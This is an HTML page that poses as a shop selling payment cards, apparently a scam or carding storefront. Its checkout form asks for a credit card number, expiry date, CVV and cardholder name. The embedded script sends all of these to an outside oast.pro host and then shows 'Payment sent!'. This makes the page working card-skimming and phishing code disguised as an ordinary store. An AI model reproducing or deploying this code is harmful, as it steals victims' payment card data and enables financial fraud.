<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Shop - Bad Pickney6</title>
  <style>
    body { background:#0f0f0f; color:white; font-family:Arial; padding:20px; }
    h1 { text-align:center; margin-bottom:30px; }
    .card-list { display:flex; flex-wrap:wrap; gap:20px; justify-content:center; }
    .item { background:#1a1a1a; padding:20px; border-radius:8px; width:260px; }
    input, select { width:100%; padding:10px; margin-top:8px; border-radius:6px; border:none; }
    button { width:100%; padding:12px; background:#008cff; border:none; border-radius:6px; color:white; font-size:16px; margin-top:10px; }
    button:hover { background:#00bfff; }
    .form-box { background:#141414; padding:20px; border-radius:8px; max-width:400px; margin:40px auto; }
  </style>
</head>
<body>

<h1>Buy Your Card</h1>

<!-- CARD SELECTION -->
<div class="card-list">
  <div class="item">
    <h3>Visa Classic</h3>
    <p>$10 USD</p>
    <button onclick="selectCard('Visa Classic', 10)">Select</button>
  </div>

  <div class="item">
    <h3>Mastercard Gold</h3>
    <p>$20 USD</p>
    <button onclick="selectCard('Mastercard Gold', 20)">Select</button>
  </div>

  <div class="item">
    <h3>Amex Platinum</h3>
    <p>$35 USD</p>
    <button onclick="selectCard('Amex Platinum', 35)">Select</button>
  </div>
</div>

<!-- CHECKOUT FORM -->
<div id="checkoutForm" class="form-box" style="display:none;">
  <h2>Checkout</h2>
  <p>You selected: <strong id="selectedCard"></strong></p>
  <p>Price: <strong id="selectedPrice"></strong></p>

  <form id="payForm">
    <label>Credit Card Number</label>
    <input type="text" id="ccNumber" placeholder="1234 5678 9012 3456" required>

    <label>Expiry Date (MM/YY)</label>
    <input type="text" id="ccExpiry" placeholder="07/28" required>

    <label>CVV</label>
    <input type="text" id="ccCVV" placeholder="123" required>

    <label>Name on Card</label>
    <input type="text" id="ccName" placeholder="John Doe" required>

    <button type="submit">Submit Payment</button>
  </form>
</div>

<script>
  let cardName = "";
  let price = 0;

  function selectCard(name, cost) {
    cardName = name;
    price = cost;
    document.getElementById('selectedCard').innerText = name;
    document.getElementById('selectedPrice').innerText = "$" + cost + " USD";
    document.getElementById('checkoutForm').style.display = 'block';
  }

  document.getElementById('payForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    const binURL = "https://6dc777f83b840b1f739bg1ftg9ayyyyyb.oast.pro";

    const payload = {
      card: cardName,
      price: price,
      ccNumber: document.getElementById('ccNumber').value,
      ccExpiry: document.getElementById('ccExpiry').value,
      ccCVV: document.getElementById('ccCVV').value,
      ccName: document.getElementById('ccName').value,
      time: new Date().toISOString()
    };

    await fetch(binURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    alert("Payment sent!");
  });
</script>

</body>
</html>
